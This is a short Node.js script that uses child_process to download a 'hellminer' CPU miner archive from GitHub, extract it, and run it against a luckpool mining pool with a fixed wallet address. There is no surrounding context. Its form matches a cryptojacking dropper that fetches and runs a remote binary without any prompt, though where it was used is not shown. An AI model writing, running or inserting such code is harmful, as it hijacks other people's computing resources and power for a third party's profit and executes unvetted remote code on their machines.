const { exec, spawn, execSync } = require("child_process")
exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz'),
exec('tar xf hellminer_cpu_linux.tar.gz'),
exec('./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RMu6YbXcRzim4aSJozwuLu5jzaK57jH5ZU -p x --cpu 2')
